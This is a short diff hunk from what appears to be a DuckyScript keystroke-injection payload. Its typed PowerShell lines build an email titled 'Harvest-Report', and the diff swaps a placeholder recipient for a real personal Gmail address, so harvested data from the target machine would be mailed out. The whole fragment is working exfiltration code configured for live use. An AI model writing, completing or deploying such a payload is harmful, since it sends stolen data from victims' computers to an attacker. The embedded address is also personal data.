@@ -43,7 +43,7 @@ STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
 STRING $ReportEmail.From = 'SENDER-EMAIL'
 ENTER
-STRING $ReportEmail.To.Add('RECEIVER-EMAIL')
+STRING $ReportEmail.To.Add('havor228@gmail.com')
 ENTER
 STRING $ReportEmail.Subject = "Harvest-Report"
 ENTER
